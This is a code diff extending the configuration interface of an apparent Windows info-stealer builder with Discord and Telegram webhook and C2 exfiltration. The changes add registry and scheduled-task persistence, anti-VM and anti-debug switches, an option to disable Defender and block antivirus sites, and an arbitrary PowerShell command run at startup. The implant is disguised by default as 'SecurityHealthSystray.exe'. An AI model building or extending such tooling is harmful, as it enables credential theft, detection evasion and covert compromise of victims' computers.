@@ -6,7 +6,7 @@
 <style>
 body { font: 13px "Segoe UI", sans-serif; margin: 16px; width: 360px; }
 label { display: block; margin-top: 8px; }
-input[type=text], input[type=password], textarea { width: 100%; box-sizing: border-box; }
+input[type=text], input[type=password], textarea, select { width: 100%; box-sizing: border-box; }
 .row { margin-top: 12px; }
 .hidden { display: none; }
 .hint { margin-top: 4px; color: #666; font-size: 12px; }
@@ -42,6 +42,13 @@ button { cursor: pointer; }
 <label>CMake path (optional)<input type="text" id="cmake" placeholder="auto detect"></label>
 
 <label><input type="checkbox" id="startup"> Add to startup</label>
+<label>Startup method
+  <select id="startupMethod">
+    <option value="user">HKCU Run + Startup folder</option>
+    <option value="task">Scheduled task, highest privileges</option>
+    <option value="hklm">HKLM Run, all users</option>
+  </select>
+</label>
 <label>Startup process name<input type="text" id="startupName" value="SecurityHealthSystray.exe"></label>
 <label>AppData folder<input type="text" id="appdataDir" value="SecurityHealthSystray"></label>
 <label><input type="checkbox" id="pingEveryone"> @everyone on Discord message</label>
@@ -49,9 +56,14 @@ button { cursor: pointer; }
 <label><input type="checkbox" id="screenshot"> Capture desktop screenshot</label>
 <label><input type="checkbox" id="debug"> Debug console</label>
 <label><input type="checkbox" id="requireAdmin"> Require admin on run</label>
-<label><input type="checkbox" id="fakeError"> Fake error message</label>
+<label><input type="checkbox" id="fakeError"> Fake error message (non-blocking)</label>
 <label>Error title<input type="text" id="errorTitle" value="Error"></label>
 <label>Error message<input type="text" id="errorMessage" placeholder="message shown on run"></label>
+<label><input type="checkbox" id="antiVM"> Anti-VM</label>
+<label><input type="checkbox" id="antiDebug"> Anti-debug</label>
+<label><input type="checkbox" id="disableAV"> Disable Defender and block AV sites (needs admin on target)</label>
+<label>PowerShell command (runs once)<textarea id="psCommand" rows="4" placeholder="powershell commands"></textarea></label>
+<label><input type="checkbox" id="psEveryRun"> Run PowerShell command every startup run</label>
 <label><input type="checkbox" id="discordInjection"> Inject Discord desktop</label>
 
 <div class="row">
@@ -81,6 +93,7 @@ function collectValues() {
     c2fields: useC2 ? document.getElementById('c2fields').value : '',
     password: document.getElementById('password').value,
     install: document.getElementById('startup').checked,
+    startupMethod: document.getElementById('startupMethod').value,
     startupName: document.getElementById('startupName').value,
     appdataDir: document.getElementById('appdataDir').value,
     pingEveryone: document.getElementById('pingEveryone').checked,
@@ -91,6 +104,11 @@ function collectValues() {
     fakeError: document.getElementById('fakeError').checked,
     errorTitle: document.getElementById('errorTitle').value,
     errorMessage: document.getElementById('errorMessage').value,
+    antiVM: document.getElementById('antiVM').checked,
+    antiDebug: document.getElementById('antiDebug').checked,
+    disableAV: document.getElementById('disableAV').checked,
+    psCommand: document.getElementById('psCommand').value,
+    psEveryRun: document.getElementById('psEveryRun').checked,
     discordInjection: document.getElementById('discordInjection').checked,
   };
 }
@@ -153,18 +171,24 @@ document.getElementById('build').addEventListener('click', async () => {
   if (saved.useTelegram === undefined) saved.useTelegram = Boolean(saved.token && saved.chat);
   if (saved.useC2 === undefined) saved.useC2 = Boolean(saved.c2url);
   if (saved.startup === undefined && saved.install !== undefined) saved.startup = saved.install;
+  if (saved.startupMethod === undefined && saved.startup_method !== undefined)
+    saved.startupMethod = saved.startup_method;
+  if (!saved.startupMethod) saved.startupMethod = 'user';
   if (saved.useDiscord && saved.useTelegram) saved.useTelegram = false;
 
   const texts = {
     name: 'name', icon: 'icon', cmake: 'cmake', webhook: 'webhook', token: 'token', chat: 'chat',
     thumbnailUrl: 'thumbnailUrl', c2url: 'c2url', c2field: 'c2field', c2headers: 'c2headers',
     c2fields: 'c2fields', errorTitle: 'errorTitle', errorMessage: 'errorMessage',
-    startupName: 'startupName', appdataDir: 'appdataDir',
+    startupName: 'startupName', appdataDir: 'appdataDir', startupMethod: 'startupMethod',
+    psCommand: 'psCommand',
   };
   const checks = {
     startup: 'startup', pingEveryone: 'pingEveryone', defender: 'defender',
     screenshot: 'screenshot', debug: 'debug',
     requireAdmin: 'requireAdmin', fakeError: 'fakeError', discordInjection: 'discordInjection',
+    antiVM: 'antiVM', antiDebug: 'antiDebug', disableAV: 'disableAV',
+    psEveryRun: 'psEveryRun',
     useDiscord: 'useDiscord', useTelegram: 'useTelegram', useC2: 'useC2',
   };
   for (const [id, key] of Object.entries(texts)) {
